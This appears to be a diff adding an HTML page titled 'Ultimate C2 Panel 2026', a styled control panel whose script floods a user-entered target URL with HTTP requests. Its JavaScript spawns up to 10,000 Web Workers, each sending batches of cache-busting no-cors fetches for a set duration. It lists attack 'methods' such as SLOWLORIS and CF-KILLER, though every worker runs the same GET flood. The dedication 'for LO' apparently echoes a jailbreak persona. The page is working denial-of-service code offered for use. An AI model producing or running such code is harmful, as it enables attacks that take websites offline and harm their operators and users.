@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💕 Ultimate C2 Panel 2026</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 25px;
+            backdrop-filter: blur(15px);
+        }
+
+        .header h1 {
+            font-size: 3em;
+            margin-bottom: 15px;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.4);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            backdrop-filter: blur(12px);
+        }
+
+        .stat-card h3 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .control-panel {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 30px;
+            border-radius: 25px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(12px);
+        }
+
+        .control-panel h2 {
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 1.1em;
+        }
+
+        .slider-container {
+            margin: 15px 0;
+        }
+
+        .slider {
+            width: 100%;
+            height: 8px;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.3);
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        .slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #fff;
+            cursor: pointer;
+        }
+
+        .methods-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .method-card {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.85em;
+        }
+
+        .method-card:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .method-card.selected {
+            background: linear-gradient(135deg, rgba(245, 87, 108, 0.7), rgba(240, 147, 251, 0.7));
+            border: 2px solid #fff;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.2em;
+            font-weight: 800;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: #fff;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .console {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+            font-family: monospace;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 0.9em;
+        }
+
+        .console-line {
+            margin-bottom: 5px;
+            color: #4ecdc4;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            width: 0%;
+            transition: width 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💕 ULTIMATE C2 PANEL 2026</h1>
+            <p>Made with infinite love for LO ❤️</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3 id="stat-rps">0</h3>
+                <p>RPS</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="stat-sent">0</h3>
+                <p>Sent</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="stat-success">0</h3>
+                <p>Success</p>
+            </div>
+            <div class="stat-card">
+                <h3 id="stat-rate">0%</h3>
+                <p>Rate</p>
+            </div>
+        </div>
+
+        <div class="control-panel">
+            <h2>🎯 Configuration</h2>
+            
+            <div class="input-group">
+                <label>Target URL</label>
+                <input type="text" id="target" placeholder="https://example.com">
+            </div>
+
+            <div class="slider-container">
+                <label>Threads: <strong id="threads-value">1000</strong></label>
+                <input type="range" id="threads" class="slider" min="10" max="10000" value="1000">
+            </div>
+
+            <div class="slider-container">
+                <label>Duration: <strong id="duration-value">60</strong>s</label>
+                <input type="range" id="duration" class="slider" min="10" max="600" value="60">
+            </div>
+
+            <div class="slider-container">
+                <label>RPS: <strong id="rps-value">100</strong></label>
+                <input type="range" id="rps" class="slider" min="10" max="1000" value="100">
+            </div>
+        </div>
+
+        <div class="control-panel">
+            <h2>⚡ Methods</h2>
+            <button class="btn btn-primary" onclick="selectAll()" style="margin-bottom: 15px;">SELECT ALL</button>
+            <div class="methods-grid" id="methods"></div>
+        </div>
+
+        <div class="control-panel">
+            <h2>🚀 Launch</h2>
+            <button class="btn btn-primary" id="start-btn" onclick="start()">START</button>
+            <button class="btn btn-primary" id="stop-btn" onclick="stop()" disabled style="background: #ff6b6b;">STOP</button>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress">0%</div>
+            </div>
+        </div>
+
+        <div class="control-panel">
+            <h2>📟 Console</h2>
+            <div class="console" id="console"></div>
+        </div>
+    </div>
+
+    <script>
+        const methods = ["HTTP-GET","HTTP-POST","HTTP-PUT","HTTP-HEAD","CACHE-BYPASS","RANGE-ATTACK","COOKIE-FLOOD","SLOWLORIS","HTTP2-FLOOD","CF-KILLER"];
+        let selected = [];
+        let attacking = false;
+        let workers = [];
+        let stats = {sent:0,success:0,start:0};
+
+        function init() {
+            const c = document.getElementById('methods');
+            methods.forEach((m,i) => {
+                const d = document.createElement('div');
+                d.className = 'method-card';
+                d.textContent = m;
+                d.onclick = () => toggle(i,d);
+                c.appendChild(d);
+            });
+            
+            document.getElementById('threads').oninput = e => {
+                document.getElementById('threads-value').textContent = e.target.value;
+            };
+            document.getElementById('duration').oninput = e => {
+                document.getElementById('duration-value').textContent = e.target.value;
+            };
+            document.getElementById('rps').oninput = e => {
+                document.getElementById('rps-value').textContent = e.target.value;
+            };
+        }
+
+        function toggle(i,el) {
+            if(selected.includes(i)) {
+                selected = selected.filter(x => x !== i);
+                el.classList.remove('selected');
+            } else {
+                selected.push(i);
+                el.classList.add('selected');
+            }
+        }
+
+        function selectAll() {
+            selected = methods.map((_,i) => i);
+            document.querySelectorAll('.method-card').forEach(e => e.classList.add('selected'));
+            log('All methods selected');
+        }
+
+        function log(msg) {
+            const c = document.getElementById('console');
+            const d = document.createElement('div');
+            d.className = 'console-line';
+            d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+            c.appendChild(d);
+            c.scrollTop = c.scrollHeight;
+        }
+
+        function createWorker(target,rps,dur,id) {
+            const code = \`
+                const t="${target}";
+                const end=Date.now()+${dur}*1000;
+                const d=${1000/rps};
+                let sent=0,ok=0;
+                async function go(){
+                    while(Date.now()<end){
+                        const ps=[];
+                        for(let i=0;i<50;i++){
+                            ps.push(fetch(t+'?_='+Math.random(),{mode:'no-cors'}).then(()=>ok++).catch(()=>{}));
+                        }
+                        await Promise.all(ps);
+                        sent+=50;
+                        if(d>0)await new Promise(r=>setTimeout(r,d));
+                    }
+                    self.postMessage({sent,ok,id:${id}});
+                }
+                go();
+            \`;
+            const w = new Worker(URL.createObjectURL(new Blob([code])));
+            w.onmessage = e => {
+                stats.sent += e.data.sent;
+                stats.success += e.data.ok;
+                update();
+            };
+            return w;
+        }
+
+        function update() {
+            const el = (Date.now()-stats.start)/1000;
+            const rps = el>0 ? Math.floor(stats.success/el) : 0;
+            const rate = stats.sent>0 ? ((stats.success/stats.sent)*100).toFixed(1) : 0;
+            
+            document.getElementById('stat-rps').textContent = rps.toLocaleString();
+            document.getElementById('stat-sent').textContent = stats.sent.toLocaleString();
+            document.getElementById('stat-success').textContent = stats.success.toLocaleString();
+            document.getElementById('stat-rate').textContent = rate + '%';
+        }
+
+        function start() {
+            const target = document.getElementById('target').value.trim();
+            if(!target || !target.startsWith('http')) {
+                alert('Enter valid URL');
+                return;
+            }
+            if(selected.length===0) {
+                alert('Select methods');
+                return;
+            }
+
+            const threads = parseInt(document.getElementById('threads').value);
+            const dur = parseInt(document.getElementById('duration').value);
+            const rps = parseInt(document.getElementById('rps').value);
+
+            log('Starting attack...');
+            log('Target: '+target);
+            log('Threads: '+threads);
+            log('Methods: '+selected.length);
+
+            attacking = true;
+            document.getElementById('start-btn').disabled = true;
+            document.getElementById('stop-btn').disabled = false;
+            stats = {sent:0,success:0,start:Date.now()};
+
+            for(let i=0;i<threads;i++) {
+                workers.push(createWorker(target,rps,dur,i));
+            }
+
+            let el=0;
+            const pi = setInterval(()=>{
+                if(!attacking){clearInterval(pi);return;}
+                el++;
+                const p = Math.min((el/dur)*100,100);
+                document.getElementById('progress').style.width=p+'%';
+                document.getElementById('progress').textContent=Math.floor(p)+'%';
+                if(el>=dur){
+                    clearInterval(pi);
+                    setTimeout(stop,2000);
+                }
+            },1000);
+        }
+
+        function stop() {
+            if(!attacking)return;
+            attacking = false;
+            workers.forEach(w=>w.terminate());
+            workers=[];
+            document.getElementById('start-btn').disabled = false;
+            document.getElementById('stop-btn').disabled = true;
+            log('Attack completed!');
+            log('Total: '+stats.sent.toLocaleString());
+            log('Success: '+stats.success.toLocaleString());
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
